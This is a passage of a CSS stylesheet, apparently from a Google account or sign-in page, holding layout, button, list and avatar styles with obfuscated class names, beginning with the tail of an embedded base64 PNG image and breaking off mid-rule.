eDjAhAaUNbhg8LzOHxoBoRwRcYVH6vsxxIgHh8VQgV4shSe8n4xoQmfkUNft8bHZoPbImQ1rTlJvprZZSimqhEBGgRum0C7btNTyo6PGTLT+8W6Hx1ArlmPLGzBMQGk+2JCwOaS/TB8gqBZUBzwmGYgXQGS4SMiRG/nKTyV+WpmbOiw+LhufJspeuu1FZkMVmrtSBA8eC+Nrvvh6e4XQiHkGkAIHyKXoRdruGSqCqAov4AwCoDwXnV/C05INRWexewnTBYUxRDYFiAdPoUAPGv3VjdUZSrVwuATZuObEPJa6JXJ1BRAainMlHVxEdm0OhethdfCa9aE3RcYVpUTIRRi2ZAMBWqX94oPNjIhfAkgIsziwbCLFvlg1wNC5mPChxXnVYVnZfbjkQWFPQHYFSDgMzhriRIfCk979xfnV2cq3VzxiXqcq5ody0zRVu5MCOGKz2Rr/OpoMfvRAmTIgnxOADZOu1sAxPBhwcPTN3NRlsLTkJiNH1w0SYNPXEU2HUKZKd5QE3ItTPsGwMukLTg/jC88G7MfLgtiEfbqA1j17PzGDfiwoPD0UXiaE7nxgRDgYfjwG7UcwRCSXeB7qjbMjrlO0bsWrsOsK5psDWfIi4Vn0/ArKni8sx8BIBk+A19YkqfwVLbOk7aJnQ2JU+lhApkVsh7XtURToaEwz2c/PEJ8mEDyPQh7vekcyTN8KDYAh8FDKDztFJ7qdM+mLXRDtoKMyHdoBsSwLiiFZ5K13EftPD4I1HkoPLXpxklb5A2AACNkMQBJXPeD27gPP8OsGs57ivpk1rQlp13Tvr+aZjooLGOoBXia0q2StrSlLW1pS1va0paU9n8hIxGzMATzqgAAAABJRU5ErkJggg==)
}

.sJRmW {
	display: block;
	height: 37px;
	margin: 0 auto;
	width: 37px
}

.yDSH6d {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-direction: row;
	flex-direction: row;
	-webkit-justify-content: center;
	justify-content: center
}

.nuuZJc {
	-webkit-align-items: center;
	align-items: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-flex: 1;
	-webkit-flex: 1;
	flex: 1
}

.SeYWud {
	border-right: 1px solid #dadce0;
	padding-bottom: 3px;
	padding-right: 14px;
	padding-top: 3px
}

.yDSH6d .L5wZDc,
.yDSH6d .l5Lhkf {
	margin-left: auto
}

.Y75akb {
	padding-left: 14px
}

.MkJJHc {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-direction: column;
	flex-direction: column;
	-webkit-justify-content: center;
	justify-content: center;
	width: 100%
}

.RCum0c>:first-child {
	margin-top: 0
}

.RCum0c>:last-child {
	margin-bottom: 0
}

.RCum0c h2 {
	font-family: 'Google Sans', arial, sans-serif;
	font-size: 16px;
	letter-spacing: .1px;
	line-height: 1.5;
	padding-bottom: 1px;
	padding-top: 9px
}

.kKkU3d {
	padding: 16px 0 0
}

.kKkU3d h2,
.kKkU3d p {
	padding-bottom: 3px;
	padding-top: 1px;
	margin-bottom: 0;
	margin-top: 0
}

.poF0b {
	height: 25vh;
	min-height: 110px;
	position: relative
}

@media all and (min-width:601px) {
	.poF0b {
		height: 150px
	}
}

.BbTTpd.poF0b {
	text-align: center
}

.cevdxc {
	height: 25vh;
	min-height: 110px;
	position: relative;
	-webkit-transform: translate(-43%, -3%);
	transform: translate(-43%, -3%);
	z-index: 3
}

@media all and (min-width:601px) {
	.cevdxc {
		height: 150px
	}
}

.BbTTpd .cevdxc {
	-webkit-transform: none;
	transform: none
}

.FphT8e {
	background-image: -webkit-linear-gradient(to bottom, rgba(233, 233, 233, 0) 0%, rgba(233, 233, 233, 0) 62.22%, rgba(233, 233, 233, 1) 40.22%, rgba(233, 233, 233, 0) 100%);
	background-image: linear-gradient(to bottom, rgba(233, 233, 233, 0) 0%, rgba(233, 233, 233, 0) 62.22%, rgba(233, 233, 233, 1) 40.22%, rgba(233, 233, 233, 0) 100%);
	height: 100%;
	left: 0;
	overflow: hidden;
	position: absolute;
	right: 0;
	top: 0;
	z-index: 2
}

.FphT8e:after,
.FphT8e:before {
	content: '';
	display: block;
	height: 100%;
	min-width: 110px;
	position: absolute;
	right: -10%;
	-webkit-transform: rotate(-104deg);
	transform: rotate(-104deg);
	width: 25vh;
	z-index: 2
}

@media all and (min-width:601px) {
	.FphT8e:after,
	.FphT8e:before {
		width: 150px
	}
}

.FphT8e:before {
	background-image: -webkit-linear-gradient(to bottom, rgba(243, 243, 243, 0) 0%, rgba(243, 243, 243, .9) 100%);
	background-image: linear-gradient(to bottom, rgba(243, 243, 243, 0) 0%, rgba(243, 243, 243, .9) 100%);
	bottom: -10%
}

.FphT8e:after {
	background-image: -webkit-linear-gradient(to bottom, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .9) 100%);
	background-image: linear-gradient(to bottom, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .9) 100%);
	bottom: -80%
}

.sfYUmb {
	color: #202124;
	font-family: 'Google Sans', arial, sans-serif;
	padding-bottom: 0;
	padding-top: 16px;
	text-align: center
}

.pbqoM {
	text-indent: -1px
}

.FgbZLd {
	font-size: 16px;
	letter-spacing: .1px;
	line-height: 1.5;
	margin: 0;
	padding-bottom: 0;
	padding-top: 8px;
	position: relative;
	text-align: center
}

.FgbZLd:after {
	clear: both;
	content: "";
	display: table
}

.RELBvb .sfYUmb,
.RELBvb .FgbZLd {
	text-align: left
}

.CbTw4b {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-justify-content: center;
	justify-content: center;
	font-weight: 500
}

.iarmfc {
	height: 20px;
	margin-right: 8px;
	vertical-align: middle;
	width: 20px
}

img.iarmfc {
	-webkit-border-radius: 50%;
	border-radius: 50%
}

.g9Xznf {
	-webkit-align-items: center;
	align-items: center;
	display: -webkit-inline-box;
	display: -webkit-inline-flex;
	display: inline-flex;
	border: 1px solid #dadce0;
	-webkit-border-radius: 16px;
	border-radius: 16px;
	color: #3c4043;
	cursor: pointer;
	font-family: 'Google Sans', arial, sans-serif;
	font-size: 14px;
	font-weight: 500;
	letter-spacing: .25px;
	line-height: initial;
	max-width: 100%;
	padding: 5px 7px 5px 5px;
	text-overflow: ellipsis
}

.g9Xznf:hover {
	background: #fafafb
}

.g9Xznf:focus {
	background: #ebecec
}

.g9Xznf.qs41qe {
	background: #fff;
	border: none;
	-webkit-box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
	box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
	position: relative;
	top: 1px
}

.IUMC0d {
	-webkit-border-radius: 10px;
	border-radius: 10px;
	height: 20px;
	margin-right: 8px
}

.pFi9pe {
	overflow: hidden;
	text-overflow: ellipsis
}

.CuCw4b {
	margin-left: 4px
}

.CuCw4b svg {
	display: block
}

.ilEhd {
	font-family: 'Google Sans', arial, sans-serif;
	font-size: 14px;
	letter-spacing: .25px;
	margin-left: 0;
	padding-bottom: 0;
	padding-top: -15px;
	overflow: hidden;
	text-overflow: ellipsis
}

.r5i3od {
	height: 32px;
	padding-right: 0
}

.KEavsb.mUbCce {
	height: 24px;
	position: absolute;
	right: 0;
	top: 6px;
	width: 24px
}

@media (hover) {
	.KEavsb:hover .MbhUzd {
		-webkit-animation: quantumWizIconFocusPulse .7s infinite alternate;
		animation: quantumWizIconFocusPulse .7s infinite alternate;
		height: 100%;
		left: 50%;
		top: 50%;
		width: 100%;
		visibility: visible
	}
}

.IqKdAd {
	position: relative
}

.IqKdAd>:first-child {
	margin-top: 0
}

.IqKdAd>:last-child {
	margin-bottom: 0
}

.VkRqje,
.EACaeb,
.WHgLQe {
	margin: 12px 0
}

.VkRqje>:first-child,
.WHgLQe>:first-child,
.vdE7Oc>:first-child {
	margin-top: 0
}

.VkRqje>:last-child,
.WHgLQe>:last-child,
.vdE7Oc>:last-child {
	margin-bottom: 0
}

.sIznTe {
	list-style: none;
	margin: 0;
	padding: 0
}

.PWofee .sIznTe {
	padding-top: 1px;
	position: relative
}

.PWofee .sIznTe:before {
	border-top: 1px solid #d5d5d5;
	content: '';
	height: 0;
	left: 72px;
	position: absolute;
	right: 0;
	top: 0
}

@media all and (min-width:450px) {
	.PWofee .sIznTe:before {
		left: 88px
	}
}

.PWofee .C5uAFc {
	position: relative
}

.PWofee .C5uAFc:after {
	border-bottom: 1px solid #d5d5d5;
	bottom: 0;
	content: '';
	height: 0;
	left: 72px;
	position: absolute;
	right: 0
}

@media all and (min-width:450px) {
	.PWofee .C5uAFc:after {
		left: 88px
	}
}

.TnvOCe {
	padding-bottom: 13px;
	padding-top: 13px
}

.TnvOCe[role="button"] {
	cursor: pointer;
	-webkit-transition: background .2s;
	transition: background .2s
}

.TnvOCe:focus {
	background: #eeeeee;
	outline: 0
}

@media (hover) {
	.TnvOCe[role="button"]:hover {
		background: #eeeeee
	}
}

.TnvOCe:after {
	clear: both;
	content: '';
	display: table
}

.wDzjuc {
	float: left;
	height: 24px;
	margin: -2px 0 0;
	overflow: hidden;
	width: 24px
}

.wDzjuc svg {
	height: 100%;
	width: 100%
}

.vdE7Oc {
	margin: 0 0 0 48px
}

.vdE7Oc p {
	margin: 4px 0
}

.cjEHje {
	color: #757575
}

.EACaeb {
	padding-bottom: 6px;
	padding-left: 48px;
	position: relative
}

.EACaeb li {
	list-style: none
}

.EACaeb li+li {
	margin-top: 12px
}

.q4UYxb {
	background: none;
	border: 0;
	cursor: pointer;
	display: block;
	font-family: inherit;
	font-size: inherit;
	outline: 0;
	padding: 0;
	position: relative;
	text-align: left;
	width: 100%
}

.q4UYxb:before {
	background: #eeeeee;
	-webkit-border-radius: 2px 0 0 2px;
	border-radius: 2px 0 0 2px;
	bottom: -6px;
	content: '';
	left: -16px;
	opacity: 0;
	position: absolute;
	right: -24px;
	top: -6px;
	-webkit-transition: opacity .2s;
	transition: opacity .2s;
	z-index: -1
}

@media all and (min-width:450px) {
	.q4UYxb:before {
		right: -40px
	}
}

.q4UYxb:focus:before {
	opacity: 1
}

@media (hover) {
	.q4UYxb:hover:before {
		opacity: 1
	}
}

.pggQ5e:before,
.w6VTHd:after {
	content: none
}

.XraQ3b {
	position: relative;
	padding-bottom: 10px;
	padding-top: 10px
}

.hPcO1c {
	-webkit-border-radius: 50%;
	border-radius: 50%;
	height: 36px;
	margin: 0;
	overflow: hidden;
	width: 36px
}

.hPcO1c img {
	max-height: 100%;
	max-width: 100%
}

.f3GIQ {
	margin-left: 60px;
	padding: 0
}

.flESue .f3GIQ {
	padding-right: 32px
}

.wpW1cb,
.bLzI3e {
	font-size: 16px;
	font-weight: 400;
	line-height: 1.25
}

.f3GIQ p {
	margin: 0
}

.uRhzae {
	overflow: hidden;
	text-overflow: ellipsis
}

.KlxXxd {
	color: #757575;
	font-size: 12px;
	font-style: italic
}

.flESue .bLzI3e {
	visibility: hidden
}

.bLzI3e .hPcO1c {
	background: #fff;
	margin: 0
}

.bLzI3e .f3GIQ {
	padding: 8px 0
}

.XQoWrb {
	margin: 30vh 0 17px;
	padding-left: 60px
}

@media all and (min-width:601px) {
	.XQoWrb {
		margin-top: 127px
	}
}

.XQoWrb:before {
	border-top: 1px solid #d5d5d5;
	content: '';
	display: block;
	height: 0;
	position: relative;
	top: -27px;
	margin-right: -24px
}

@media all and (min-width:450px) {
	.XQoWrb:before {
		margin-right: -40px
	}
}

.asG8Cb.asG8Cb {
	height: 24px;
	opacity: 0;
	overflow: hidden;
	padding-left: 0;
	position: absolute;
	right: 0;
	top: 10px;
	width: 24px
}

.flESue .asG8Cb {
	opacity: 1
}

.pFQEyb {
	background: #fff;
	-webkit-border-radius: 2px;
	border-radius: 2px;
	-webkit-box-shadow: 0 6px 20px 0 rgba(0, 0, 0, 0.19);
	box-shadow: 0 6px 20px 0 rgba(0, 0, 0, 0.19);
	list-style: none;
	min-width: 112px;
	outline: none;
	padding: 8px 0;
	width: 168px;
	z-index: 4
}

.yQaJQ {
	color: rgba(0, 0, 0, .87);
	cursor: pointer;
	outline: none;
	padding: 14px
}

.nyoS7c .yQaJQ:focus {
	background-color: rgba(0, 0, 0, 0.12)
}

.GtglAe {
	-webkit-align-items: center;
	align-items: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-direction: row-reverse;
	flex-direction: row-reverse;
	-webkit-flex-wrap: wrap;
	flex-wrap: wrap;
	-webkit-justify-content: space-between;
	justify-content: space-between;
	margin-top: 32px;
	min-height: 48px;
	padding-bottom: 0
}

.ZVbyIf .GtglAe {
	-webkit-flex-direction: column;
	flex-direction: column
}

.OZliR,
.AIu8h {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1
}

.OZliR {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-direction: row-reverse;
	flex-direction: row-reverse
}

.AIu8h {
	text-align: left
}

.Hj2jlf {
	white-space: nowrap
}

.Hj2jlf.hjPfd {
	background: #9e9e9e;
	color: #fff
}

.mFF2Eb {
	display: none
}

.dKVcQ .snByac {
	margin: 8px 16px
}

.OZliR .Hj2jlf.Zf2Owf {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	margin-right: 16px
}

.PRgm8e .Hj2jlf.Zf2Owf .uBOgn {
	display: none
}

.XdSybe {
	-webkit-align-items: center;
	align-items: center;
	display: none;
	opacity: .54
}

.PRgm8e .XdSybe {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.yb9KU {
	display: none
}

.nmdOZe {
	word-break: break-all
}

.wZrmNc {
	margin: auto;
	max-width: 380px;
	overflow: hidden;
	position: relative
}

.wZrmNc .KE3vP {
	position: relative;
	text-align: center
}

.wlMuWb {
	-webkit-border-radius: 50%;
	border-radius: 50%;
	overflow: hidden
}

.wZrmNc .wlMuWb {
	height: 64px;
	margin: 0 auto 8px;
	width: 64px
}

.wlMuWb svg,
.wlMuWb img {
	display: block;
	height: 64px;
	width: 64px
}

.wZrmNc .aN1lKb {
	font-size: 16px
}

.st8MM {
	word-break: break-all
}

.rsFRt .MQL3Ob {
	opacity: 0
}

.F90rfc {
	display: inline-block
}

.OLbd6e {
	display: inline-block;
	list-style: none;
	padding: 0
}

.OLbd6e li {
	display: inline-block;
	padding-left: 15px
}

.uhlTsf {
	color: #3367d6;
	margin-bottom: 8px;
	display: inline-block;
	list-style: none
}

.uhlTsf:hover {
	color: #3367d6;
	cursor: pointer
}

.uhlTsf:active span,
.uhlTsf:focus span {
	background-color: rgba(51, 103, 214, 0.12);
	display: inline-block;
	border-radius: 2px;
	margin: -3px;
	padding: 3px
}

.zQJV3 {
	-webkit-align-items: flex-start;
	align-items: flex-start;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-flex: 0;
	box-flex: 0;
	-webkit-flex-grow: 0;
	flex-grow: 0;
	-webkit-flex-wrap: wrap;
	flex-wrap: wrap;
	-webkit-justify-content: space-between;
	justify-content: space-between;
	margin-left: -8px;
	margin-top: 32px;
	min-height: 48px;
	padding-bottom: 20px
}

.zQJV3.fXx9Lc {
	margin: 0;
	min-height: 0;
	padding: 0
}

.So2chb {
	-webkit-align-self: auto;
	align-self: auto;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	width: 100%;
	margin-bottom: 32px
}

.dG5hZc {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-direction: row-reverse;
	flex-direction: row-reverse;
	-webkit-flex-wrap: wrap;
	flex-wrap: wrap;
	width: 100%
}

.qhFLie,
.daaWTb {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1
}

.zQJV3.NNItQ:not(.F8PBrb) .qhFLie,
.zQJV3.NNItQ:not(.F8PBrb) .daaWTb {
	text-align: center
}

.qhFLie {
	text-align: right
}

.zQJV3.NNItQ .qhFLie {
	padding-left: 8px
}

.zQJV3.F8PBrb .qhFLie {
	padding-left: 8px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-justify-content: space-between;
	justify-content: space-between;
	-webkit-flex-wrap: wrap;
	flex-wrap: wrap;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	width: 100%
}

.zQJV3.NNItQ .daaWTb,
.zQJV3.F8PBrb .qhFLie+.daaWTb {
	margin-top: 16px
}

.zQJV3:not(.NNItQ) .daaWTb .kDmnNe,
.zQJV3:not(.NNItQ) .daaWTb .NaOGkc,
.zQJV3:not(.NNItQ) .daaWTb .t29vte {
	text-align: left
}

.qhFLie .snByac,
.daaWTb .snByac {
	max-width: 300px
}

.DL0QTb .snByac {
	margin: 8px 16px
}

.QdPEBc {
	-webkit-flex: 0 0 calc(50% - 4px);
	flex: 0 0 calc(50% - 4px);
	width: 114px
}

.kDmnNe+.OIPlvf,
.NaOGkc+.OIPlvf {
	margin-top: 32px
}

.zQJV3 .t29vte.u3bW4e {
	background-color: transparent
}

.t29vte .g4jUVc {
	background-color: transparent;
	opacity: 1
}

.t29vte.u3bW4e .g4jUVc {
	background-color: rgba(26, 115, 232, 0.149)
}

.zQJV3 .t29vte.iWO5td .MbhUzd {
	background-image: radial-gradient(circle farthest-side, rgba(26, 115, 232, 0.251), rgba(26, 115, 232, 0.251) 80%, rgba(26, 115, 232, 0) 100%)
}

.t29vte [jsslot] span {
	color: #1a73e8;
	line-height: 1.4286;
	margin: 8px;
	text-transform: none
}

.t29vte [jsslot] {
	margin: 0
}

.ILYVD {
	background: #fff
}

.ILYVD .FwR7Pc {
	background: rgba(60, 64, 67, 0.039)
}

.ILYVD .oJeWuf {
	color: #202124
}

.ILYVD .FwR7Pc .oJeWuf {
	color: #202124
}

.ILYVD .MbhUzd {
	display: none
}

.QOjPPc {
	display: none;
	margin: 20px 0 -25px;
	text-align: center;
	width: 100%
}

@media all and (min-width:601px) {
	.Ggbike .QOjPPc {
		display: block
	}
}

.QOjPPc .snByac {
	text-transform: uppercase
}

.QOjPPc .snByac:after,
.QOjPPc .snByac:before {
	display: inline-block;
	font-size: 22px;
	margin-bottom: 1px;
	vertical-align: bottom
}

.QOjPPc .l7RQpf .snByac:after {
	content: '\00203a';
	padding-left: 6px
}

.QOjPPc .yVrXae .snByac:before {
	content: '\002039';
	padding-right: 6px
}

.eGuEjc,
.N7TWSb {
	display: inline-block;
	vertical-align: middle
}

.fsv3tf {
	margin: auto;
	max-width: 380px;
	overflow: hidden;
	position: relative
}

.fsv3tf .tgnCOd {
	position: relative;
	text-align: center
}

.qQWzTd {
	-webkit-border-radius: 50%;
	border-radius: 50%;
	color: #5f6368;
	overflow: hidden
}

.w1I7fb {
	font-family: 'Google Sans', arial, sans-serif;
	line-height: 1.4286
}

.d2laFc {
	width: 100%
}

.d2laFc .qQWzTd {
	-webkit-box-flex: none;
	-webkit-flex: none;
	flex: none;
	height: 28px;
	margin-right: 12px;
	width: 28px
}

.d2laFc .tgnCOd,
.s2n8Rd .tgnCOd {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-align-items: center;
	align-items: center
}

.d2laFc .tgnCOd {
	-webkit-justify-content: center;
	justify-content: center
}

.fsv3tf .qQWzTd {
	height: 64px;
	margin: 0 auto 8px;
	width: 64px
}

.r78aae {
	-webkit-border-radius: 50%;
	border-radius: 50%;
	display: block
}

.d2laFc .r78aae,
.d2laFc .stUf5b,
.d2laFc .G5XIyb {
	max-height: 100%;
	max-width: 100%
}

.fsv3tf .r78aae,
.fsv3tf .stUf5b,
.fsv3tf .G5XIyb {
	height: 64px;
	width: 64px
}

.s2n8Rd {
	height: 20px
}

.s2n8Rd .qQWzTd {
	margin-right: 8px;
	height: 20px;
	min-width: 20px
}

.s2n8Rd .r78aae,
.s2n8Rd .stUf5b,
.s2n8Rd .G5XIyb {
	color: #3c4043;
	height: 20px;
	width: 20px
}

.s2n8Rd .WBW9sf {
	overflow: hidden
}

.s2n8Rd .wLBAL {
	overflow: hidden;
	text-overflow: ellipsis;
	white-space: nowrap
}

.d2laFc .WBW9sf {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1
}

.d2laFc .w1I7fb {
	color: #3c4043;
	font-size: 14px;
	font-weight: 500
}

.fsv3tf .w1I7fb {
	color: #202124;
	font-size: 14px
}

.wLBAL {
	direction: ltr;
	font-size: 12px;
	text-align: left;
	line-height: 1.3333;
	word-break: break-all
}

.PdSZIe {
	direction: ltr;
	font-size: 12px;
	text-align: left;
	line-height: 1.3333;
	word-break: break-all;
	color: #5f6368
}

.s2n8Rd .wLBAL {
	color: #3c4043
}

.d2laFc .wLBAL {
	color: #5f6368
}

.fsv3tf .wLBAL {
	color: #5f6368
}

.cRiDhf {
	color: #5f6368;
	font-size: 12px
}

.d2laFc .cRiDhf {
	-webkit-align-self: flex-start;
	align-self: flex-start;
	-webkit-box-flex: none;
	-webkit-flex: none;
	flex: none;
	line-height: 1.3333
}

.PrDSKc {
	padding-bottom: 3px;
	padding-top: 9px
}

.PrDSKc:empty {
	display: none
}

.pQ0lne {
	position: relative
}

.OVnw0d>:first-child {
	margin-top: 0
}

.OVnw0d>:last-child {
	margin-bottom: 0
}

.vxx8jf {
	color: #202124;
	font-size: 14px
}

.vxx8jf .PrDSKc {
	margin: 0;
	padding: 0
}

.vxx8jf>:first-child {
	margin-top: 0;
	padding-top: 0
}

.vxx8jf>:last-child {
	margin-bottom: 0;
	padding-bottom: 0
}

.OVnw0d {
	margin: 0;
	padding: 0;
	position: relative
}

.OVnw0d>.SmR8:only-child {
	padding-top: 1px
}

.OVnw0d>.SmR8:only-child:before {
	top: 0
}

.OVnw0d>.SmR8:not(first-child) {
	padding-bottom: 1px
}

.OVnw0d>.SmR8:after {
	bottom: 0
}

.OVnw0d>.SmR8:only-child:before,
.OVnw0d>.SmR8:after {
	border-bottom: 1px solid #dadce0;
	content: '';
	height: 0;
	left: 24px;
	right: 24px;
	position: absolute
}

@media all and (min-width:450px) {
	.OVnw0d>.SmR8:only-child:before,
	.OVnw0d>.SmR8:after {
		left: 40px;
		right: 40px
	}
}

.JDAKTe {
	margin-top: 8px;
	margin-left: 25px;
	padding-left: 15px
}

.JDAKTe.W7Aapd,
.JDAKTe.SmR8,
.JDAKTe.cd29Sd {
	margin: 0 -24px;
	list-style: none;
	padding: 0;
	position: relative
}

@media all and (min-width:450px) {
	.JDAKTe.cd29Sd,
	.JDAKTe.SmR8 {
		margin: 0 -40px
	}
}

.JDAKTe.zpCp3 {
	margin: auto -24px
}

@media all and (min-width:450px) {
	.JDAKTe.zpCp3 {
		margin: auto -40px
	}
}

.lCoei {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	padding-bottom: 16px;
	padding-top: 16px
}

.OVnw0d>.SmR8 .lCoei {
	padding-bottom: 15px;
	padding-top: 15px
}

.lCoei.SmR8 {
	cursor: pointer
}

.lCoei.RDPZE {
	cursor: default;
	opacity: .5;
	outline: 0;
	pointer-events: none
}

.lCoei.YZVTmd {
	padding-left: 24px;
	padding-right: 24px
}

@media all and (min-width:450px) {
	.lCoei.YZVTmd {
		padding-left: 40px;
		padding-right: 40px
	}
}

.lCoei[role="button"],
.lCoei[role="link"] {
	cursor: pointer;
	-webkit-transition: background .2s;
	transition: background .2s
}

.lCoei:focus {
	outline: 0
}

.lCoei[role="button"]:focus,
.lCoei[role="link"]:focus {
	background: #e8f0fe
}

@media (hover) {
	.lCoei[role="button"]:hover,
	.lCoei[role="link"]:hover {
		background: #e8f0fe
	}
}

.wupBIe {
	color: #5f6368;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	height: 24px;
	margin: -2px 0 0;
	overflow: hidden;
	width: 24px
}

.wupBIe .stUf5b,
.wupBIe .G5XIyb {
	height: 100%;
	width: 100%
}

.JDAKTe.SmR8 .wupBIe {
	color: #1a73e8
}

.JDAKTe.cd29Sd .vxx8jf {
	margin: 0 0 0 16px;
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1
}

.JDAKTe.riGH9 .vxx8jf {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1
}

.n4LT9 {
	color: #5f6368;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-justify-content: center;
	justify-content: center;
	height: 24px;
	width: 24px
}

.R1xbyb {
	color: #5f6368;
	font-size: 12px;
	line-height: 1.3333;
	padding-top: 3px
}

.R1xbyb>:first-child {
	margin-top: 0;
	padding-top: 0
}

.R1xbyb>:last-child {
	margin-bottom: 0;
	padding-bottom: 0
}

.c7fp5b {
	-webkit-user-select: none;
	-webkit-transition: background .3s;
	transition: background .3s;
	border: 0;
	-webkit-border-radius: 3px;
	border-radius: 3px;
	color: #444;
	cursor: pointer;
	display: inline-block;
	font-size: 14px;
	font-weight: 500;
	min-width: 88px;
	outline: none;
	overflow: hidden;
	position: relative;
	text-align: center;
	-webkit-tap-highlight-color: transparent
}

.hhcOmc {
	color: #fff;
	fill: #fff
}

.JvtX2e {
	-webkit-transition: box-shadow .28s cubic-bezier(0.4, 0.0, 0.2, 1);
	transition: box-shadow .28s cubic-bezier(0.4, 0.0, 0.2, 1);
	background: #dfdfdf;
	-webkit-box-shadow: 0 2px 2px 0 rgba(0, 0, 0, 0.14), 0 3px 1px -2px rgba(0, 0, 0, 0.12), 0 1px 5px 0 rgba(0, 0, 0, 0.2);
	box-shadow: 0 2px 2px 0 rgba(0, 0, 0, 0.14), 0 3px 1px -2px rgba(0, 0, 0, 0.12), 0 1px 5px 0 rgba(0, 0, 0, 0.2)
}

.rGMe1e {
	background: #4285f4;
	color: #fff
}

.JvtX2e.qs41qe {
	-webkit-transition: box-shadow .28s cubic-bezier(0.4, 0.0, 0.2, 1);
	transition: box-shadow .28s cubic-bezier(0.4, 0.0, 0.2, 1);
	-webkit-transition: background .8s;
	transition: background .8s;
	-webkit-box-shadow: 0 8px 10px 1px rgba(0, 0, 0, 0.14), 0 3px 14px 2px rgba(0, 0, 0, 0.12), 0 5px 5px -3px rgba(0, 0, 0, 0.2);
	box-shadow: 0 8px 10px 1px rgba(0, 0, 0, 0.14), 0 3px 14px 2px rgba(0, 0, 0, 0.12), 0 5px 5px -3px rgba(0, 0, 0, 0.2)
}

.rGMe1e.qs41qe {
	background: #3367d6
}

.JvtX2e.RDPZE {
	background: rgba(153, 153, 153, 0.102)
}

.g4jUVc {
	-webkit-transition: opacity .2s ease;
	transition: opacity .2s ease;
	background-color: rgba(0, 0, 0, 0.122);
	bottom: 0;
	left: 0;
	opacity: 0;
	pointer-events: none;
	position: absolute;
	right: 0;
	top: 0
}

.FS4hgd.u3bW4e {
	background-color: rgba(153, 153, 153, 0.4)
}

.hhcOmc.u3bW4e {
	background-color: rgba(204, 204, 204, 0.251)
}

.JvtX2e.u3bW4e .g4jUVc {
	opacity: 1
}

.lVYxmb {
	-webkit-transform: translate(-50%, -50%) scale(0);
	transform: translate(-50%, -50%) scale(0);
	-webkit-transition: opacity .2s ease;
	transition: opacity .2s ease;
	-webkit-background-size: cover;
	background-size: cover;
	left: 0;
	opacity: 0;
	pointer-events: none;
	position: absolute;
	top: 0;
	visibility: hidden
}

.c7fp5b.iWO5td>.lVYxmb {
	-webkit-transition: -webkit-transform .3s cubic-bezier(0.0, 0.0, 0.2, 1);
	transition: -webkit-transform .3s cubic-bezier(0.0, 0.0, 0.2, 1);
	-webkit-transition: transform .3s cubic-bezier(0.0, 0.0, 0.2, 1);
	transition: transform .3s cubic-bezier(0.0, 0.0, 0.2, 1);
	-webkit-transform: translate(-50%, -50%) scale(2.2);
	transform: translate(-50%, -50%) scale(2.2);
	opacity: 1;
	visibility: visible
}

.c7fp5b.j7nIZb>.lVYxmb {
	-webkit-transform: translate(-50%, -50%) scale(2.2);
	transform: translate(-50%, -50%) scale(2.2);
	visibility: visible
}

.c7fp5b>.lVYxmb {
	background-image: radial-gradient(circle farthest-side, rgba(153, 153, 153, 0.4), rgba(153, 153, 153, 0.4) 80%, rgba(153, 153, 153, 0) 100%)
}

.FS4hgd.iWO5td>.lVYxmb {
	background-image: radial-gradient(circle farthest-side, rgba(153, 153, 153, 0.4), rgba(153, 153, 153, 0.4) 80%, rgba(153, 153, 153, 0) 100%)
}

.hhcOmc.iWO5td>.lVYxmb {
	background-image: radial-gradient(circle farthest-side, rgba(204, 204, 204, 0.251), rgba(204, 204, 204, 0.251) 80%, rgba(204, 204, 204, 0) 100%)
}

.FS4hgd.RDPZE {
	color: rgba(68, 68, 68, 0.502);
	fill: rgba(68, 68, 68, 0.502);
	cursor: default
}

.hhcOmc.RDPZE {
	color: rgba(255, 255, 255, 0.502);
	fill: rgba(255, 255, 255, 0.502)
}

.c7fp5b.RDPZE {
	-webkit-box-shadow: none;
	box-shadow: none;
	color: rgba(68, 68, 68, 0.502);
	cursor: default
}

.I3EnF {
	position: relative;
	margin: 16px
}

.NlWrkb {
	display: inline-block;
	line-height: 48px
}

.YZrg6 {
	-webkit-align-items: center;
	align-items: center;
	border: 1px solid #dadce0;
	color: #3c4043;
	cursor: pointer;
	display: -webkit-inline-box;
	display: -webkit-inline-flex;
	display: inline-flex;
	font-family: 'Google Sans', arial, sans-serif;
	font-size: 14px;
	font-weight: 500;
	letter-spacing: .25px;
	max-width: 100%
}

.YZrg6:hover {
	background: rgba(60, 64, 67, 0.039)
}

.YZrg6:focus {
	background: rgba(60, 64, 67, 0.122)
}

.YZrg6.qs41qe {
	background: rgba(60, 64, 67, 0.122);
	border-color: #3c4043;
	color: #3c4043;
	position: relative
}

.HnRr5d {
	-webkit-border-radius: 16px;
	border-radius: 16px;
	padding: 5px 7px 5px 5px
}

.gPHLDe {
